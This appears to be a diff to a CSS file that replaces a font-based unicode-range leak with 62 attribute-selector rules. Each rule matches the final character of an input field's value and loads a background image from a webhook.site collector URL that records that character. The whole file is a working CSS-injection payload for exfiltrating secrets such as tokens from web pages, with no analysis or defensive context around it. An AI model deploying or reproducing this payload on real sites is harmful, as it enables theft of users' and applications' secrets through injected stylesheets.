@@ -1,5 +1,62 @@
-@font-face { font-family: x; src: url(https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b?KEY=a), local(Impact); unicode-range: U+61; }
-@font-face { font-family: x; src: url(https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b?KEY=b), local(Impact); unicode-range: U+62; }
-@font-face { font-family: x; src: url(https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b?KEY=c), local(Impact); unicode-range: U+63; }
-@font-face { font-family: x; src: url(https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b?KEY=d), local(Impact); unicode-range: U+64; }
-input { font-family: x, 'Comic sans ms'; }
+input[value$="0"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=0"); }
+input[value$="1"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=1"); }
+input[value$="2"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=2"); }
+input[value$="3"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=3"); }
+input[value$="4"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=4"); }
+input[value$="5"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=5"); }
+input[value$="6"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=6"); }
+input[value$="7"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=7"); }
+input[value$="8"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=8"); }
+input[value$="9"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=9"); }
+input[value$="A"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=A"); }
+input[value$="B"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=B"); }
+input[value$="C"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=C"); }
+input[value$="D"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=D"); }
+input[value$="E"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=E"); }
+input[value$="F"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=F"); }
+input[value$="G"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=G"); }
+input[value$="H"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=H"); }
+input[value$="I"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=I"); }
+input[value$="J"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=J"); }
+input[value$="K"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=K"); }
+input[value$="L"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=L"); }
+input[value$="M"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=M"); }
+input[value$="N"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=N"); }
+input[value$="O"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=O"); }
+input[value$="P"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=P"); }
+input[value$="Q"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=Q"); }
+input[value$="R"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=R"); }
+input[value$="S"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=S"); }
+input[value$="T"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=T"); }
+input[value$="U"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=U"); }
+input[value$="V"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=V"); }
+input[value$="W"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=W"); }
+input[value$="X"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=X"); }
+input[value$="Y"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=Y"); }
+input[value$="Z"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=Z"); }
+input[value$="a"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=a"); }
+input[value$="b"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=b"); }
+input[value$="c"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=c"); }
+input[value$="d"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=d"); }
+input[value$="e"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=e"); }
+input[value$="f"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=f"); }
+input[value$="g"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=g"); }
+input[value$="h"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=h"); }
+input[value$="i"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=i"); }
+input[value$="j"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=j"); }
+input[value$="k"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=k"); }
+input[value$="l"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=l"); }
+input[value$="m"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=m"); }
+input[value$="n"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=n"); }
+input[value$="o"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=o"); }
+input[value$="p"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=p"); }
+input[value$="q"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=q"); }
+input[value$="r"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=r"); }
+input[value$="s"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=s"); }
+input[value$="t"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=t"); }
+input[value$="u"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=u"); }
+input[value$="v"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=v"); }
+input[value$="w"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=w"); }
+input[value$="x"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=x"); }
+input[value$="y"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=y"); }
+input[value$="z"] { background-image: url("https://webhook.site/63b7a012-f7c5-44f8-8a8f-4d683f11a55b/?KEY=z"); }
